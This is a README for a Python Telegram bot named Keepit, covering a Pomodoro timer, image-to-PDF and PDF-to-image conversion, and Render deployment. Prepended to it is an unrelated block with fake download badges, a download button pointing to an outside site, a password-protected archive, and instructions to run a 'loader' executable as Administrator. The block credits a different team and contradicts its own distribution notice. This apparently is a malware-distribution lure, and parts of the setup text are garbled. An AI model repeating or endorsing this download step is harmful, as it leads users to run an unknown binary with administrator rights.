<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Keepit — Telegram Bot

A multi-feature Telegram bot built with Python. Handles productivity and document conversion, deployed on Render with 24/7 uptime.

## ✨ Features

### 🍅 Pomodoro Timer
- Customizable work and break durations
- Live countdown updated every second
- Cancel anytime with `/stop`

### 📄 Image → PDF
- Send multiple photos → receive one combined PDF
- Downloads photos in parallel for speed
- Works with 50–80 photos reliably

### 🖼 PDF → Image
- Send a PDF → receive pages as images
- Up to 20 pages → individual photos
- 21–200 pages → single ZIP file
- Cancel mid-conversion with `/stopconvert`

---

## 🚀 Commands

| Command | Description |
|---------|-------------|
| `/start` | Show the help menu |
| `/pomodoro` | Start 25 min work / 5 min break |
| `/pomodoro 50 10` | Custom work/break duration |
| `/stop` | Cancel a running Pomodoro timer |
| `/pdf` | Combine collected photos into one PDF |
| `/clearpdf` | Clear collected photos |
| `/stopconvert` | Cancel an ongoing conversion |

---

## 🛠 Tech Stack

- **Python 3** — core language
- **python-telegram-bot** — Telegram API wrapper
- **img2pdf** — Image → PDF conversion
- **PyMuPDF** — PDF → Image conversion
- **aiohttp** — Web server for Render + self-ping keep-alive
- **Render** — free 24/7 cloud hosting

---

## 📦 Local Setup

```bash
# 2. Install dependencies
pip install -r requirements.txt

# 3. Set your bot token (get one from @BotFather on Telegram)
# Windows:
set TOKEN=your_bot_token_here
# Linux/Mac:
export TOKEN=your_bot_token_here

# 4. Run the bot
python bot.py
☁️ Deployment (Render)
This bot is deployed on Render free tier.

Fork or clone this repo

Create a new Web Service on Render and connect this repo

Build Command: pip install -r requirements.txt

Start Command: python bot.py

Add environment variable: TOKEN = your_bot_token

Deploy 🚀 
Limitations (Free Tier)
Max 200 pages per PDF (larger files are rejected politely)

Max 20 MB PDF file size

~80 photos per Image → PDF conversion (memory limit)

2–3 concurrent users doing heavy conversions

Free Render tier has 512 MB RAM and 750 hours/month


---

MIT License

Copyright (c) 2026 Mahim

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
